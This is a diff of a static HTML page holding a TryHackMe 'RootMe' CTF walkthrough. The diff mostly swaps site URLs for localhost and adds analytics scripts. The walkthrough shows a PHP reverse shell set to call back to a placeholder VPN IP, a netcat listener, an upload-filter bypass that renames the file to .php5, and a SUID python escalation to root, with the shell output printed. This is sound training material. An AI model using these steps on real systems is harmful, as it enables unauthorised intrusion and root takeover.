@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -13,7 +13,7 @@
 
 
 
-<meta name="author" content="Animesh Roy"  />
+<meta name="author" content="Animesh Roy @anir0y  "  />
 <meta name="description" content="TryHackMe Room RootMe solved by Animesh Roy. this is a walkthough. read more..." />
 
 
@@ -34,6 +34,16 @@
 
 
 
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
 <meta property="og:title" content="Animesh Roy | Blogs & Writeups">
@@ -41,9 +51,11 @@
 <meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
 
 
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
 
 <meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-rrootme/">
+<meta property="twitter:url" content="http://localhost:1313/post/tryhackme-rrootme/">
 
 <meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
 <meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
@@ -63,22 +75,29 @@
 
 
 
-<link rel="canonical" href="https://classroom.anir0y.in/post/tryhackme-rrootme/" />
+<link rel="canonical" href="http://localhost:1313/post/tryhackme-rrootme/" />
 
 
-<meta property="og:title" content="TryHackMe RootMe" />
-<meta property="og:description" content="TryHackMe Room RootMe solved by Animesh Roy. this is a walkthough. read more..." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-rrootme/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-07-06T13:36:08+05:30" />
-<meta property="article:modified_time" content="2021-07-06T13:36:08+05:30" />
+<meta property="og:url" content="http://localhost:1313/post/tryhackme-rrootme/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="TryHackMe RootMe">
+  <meta property="og:description" content="TryHackMe Room RootMe solved by Animesh Roy. this is a walkthough. read more...">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-07-06T13:36:08+05:30">
+    <meta property="article:modified_time" content="2021-07-06T13:36:08+05:30">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Rooms">
+    <meta property="article:tag" content="Thm">
+    <meta property="article:tag" content="RootMe">
 
 
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TryHackMe RootMe"/>
-<meta name="twitter:description" content="TryHackMe Room RootMe solved by Animesh Roy. this is a walkthough. read more..."/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe RootMe">
+  <meta name="twitter:description" content="TryHackMe Room RootMe solved by Animesh Roy. this is a walkthough. read more...">
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -153,7 +172,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/classroom.anir0y.in'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
   </div>
   
   <div class="item">
@@ -212,10 +231,10 @@
         <i class="save icon"></i>
       </button>
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20RootMe&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-rrootme%2f" class="ui circular twitter icon button">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20RootMe&url=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-rrootme%2f" class="ui circular twitter icon button">
   <i class="twitter icon"></i>
 </a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-rrootme%2f" class="ui circular facebook icon button">
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-rrootme%2f" class="ui circular facebook icon button">
   <i class="facebook icon"></i>
 </a>
 
@@ -268,28 +287,27 @@
 <ul>
 <li>
 <p>find a php shell and copy to home dir.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ip-10-10-167-77:~# locate php-reverse
-/usr/share/webshells/php/php-reverse-shell.php
-/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
-root@ip-10-10-167-77:~# cp /usr/share/webshells/php/php-reverse-shell.php .
-
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-167-77:~# locate php-reverse
+</span></span><span style="display:flex;"><span>/usr/share/webshells/php/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>root@ip-10-10-167-77:~# cp /usr/share/webshells/php/php-reverse-shell.php .
+</span></span></code></pre></div></li>
 <li>
 <p>Modify the shell with our VPN IP &amp; Port(you can select any port number)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">49</span> $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YOUR_VPN_IP&#39;</span>;  // IP line <span style="color:#ae81ff">49</span>
-<span style="color:#ae81ff">50</span> $port <span style="color:#f92672">=</span> 9001;       // PORT line <span style="color:#ae81ff">50</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">49</span> $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YOUR_VPN_IP&#39;</span>;  // IP line <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50</span> $port <span style="color:#f92672">=</span> 9001;       // PORT line <span style="color:#ae81ff">50</span>
+</span></span></code></pre></div></li>
 <li>
 <p>start a listener on our system</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">9001</span> <span style="color:#75715e">#our port numebr</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9001</span> <span style="color:#75715e">#our port numebr</span>
+</span></span></code></pre></div></li>
 <li>
 <p>Upload the php file to the website using the hidden directory we found in <a href="#23">task 2.3</a></p>
 <p>you&rsquo;ll receive this error msg:</p>
 <p><img src="https://i.imgur.com/S7aP6XZ.png" alt="img"></p>
 <p>seems like some short of php filering?? let&rsquo;s try with diffrent php extention like <code>php5</code> instead of <code>.php</code> our new shell file is now <code>rev.php5</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root# mv rev.php rev.php5
-</code></pre></div><p>let&rsquo;s try again!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root# mv rev.php rev.php5
+</span></span></code></pre></div><p>let&rsquo;s try again!</p>
 <p><strong>IT WORKEDDD!!!</strong></p>
 <p><img src="https://i.imgur.com/MomaQ6I.png" alt="img"></p>
 <p>now let&rsquo;s browse to <code>http://MACHINE_IP/uploads</code> and click on our file name <code>rev.php5</code></p>
@@ -302,13 +320,12 @@ root@ip-10-10-167-77:~# cp /usr/share/webshells/php/php-reverse-shell.php .
 <ul>
 <li>
 <p>run this command</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root# find / -type f -name user.txt 2&gt; /dev/null
-
-root# /var/www/user.txt <span style="color:#75715e">#location. </span>
-
-root# cat /var/www/user.txt <span style="color:#75715e">#read the flag</span>
-
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root# find / -type f -name user.txt 2&gt; /dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root# /var/www/user.txt <span style="color:#75715e">#location. </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root# cat /var/www/user.txt <span style="color:#75715e">#read the flag</span>
+</span></span></code></pre></div><ul>
 <li>-type f – you are telling find to look exclusively for files</li>
 <li>-name user.txt – instructing the find command to search for a file with the name “user.txt”</li>
 <li>2&gt; /dev/null – so error messages do not show up as part of the search result</li>
@@ -345,25 +362,25 @@ data-ad-slot="7160066188"></ins></p>
 <p><code>python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)</code></p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ip-10-10-167-77:~$ nc -lvnp <span style="color:#ae81ff">9001</span>
-Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 9001<span style="color:#f92672">)</span>
-Connection from 10.10.71.82 <span style="color:#ae81ff">39224</span> received!
-Linux rootme 4.15.0-112-generic <span style="color:#75715e">#113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
- 08:49:18 up <span style="color:#ae81ff">38</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.02, 0.06
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-/bin/sh: 0: cant access tty; job control turned off
-$ id
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-$ python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
-
-     <span style="color:#75715e"># you might see a blank line, just type `id` or `whoami` to verify root</span>
-
-id
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-cat /root/root.txt
-THM<span style="color:#f92672">{</span>blaah-blah<span style="color:#f92672">}</span>
-</code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-167-77:~$ nc -lvnp <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 9001<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Connection from 10.10.71.82 <span style="color:#ae81ff">39224</span> received!
+</span></span><span style="display:flex;"><span>Linux rootme 4.15.0-112-generic <span style="color:#75715e">#113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 08:49:18 up <span style="color:#ae81ff">38</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.02, 0.06
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: cant access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     <span style="color:#75715e"># you might see a blank line, just type `id` or `whoami` to verify root</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>blaah-blah<span style="color:#f92672">}</span>
+</span></span></code></pre></div><hr>
 <!-- Google Ads -->
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 <p><ins class="adsbygoogle"
@@ -392,7 +409,7 @@ data-ad-slot="7160066188"></ins></p>
 
             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2023 Classroom</p>
+              <p>© 2010 - 2025 Classroom</p>
               
 
               
@@ -603,7 +620,7 @@ data-ad-slot="7160066188"></ins></p>
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/classroom.anir0y.in/index.json', function (data) {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
